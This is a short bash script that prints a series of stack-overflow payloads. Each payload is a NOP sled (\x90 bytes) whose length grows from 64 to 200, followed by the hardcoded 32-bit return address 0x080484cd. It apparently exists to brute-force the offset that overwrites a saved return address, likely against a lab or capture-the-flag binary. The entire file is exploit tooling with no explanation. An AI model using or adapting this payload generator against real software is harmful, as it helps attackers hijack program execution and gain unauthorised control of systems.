#!/bin/bash

for i in `seq 64 200`;
do
myString=$(printf "%${i}s");
echo ${myString// /\\x90}"\\xcd\\x84\\x04\\x08"
sleep 3
done
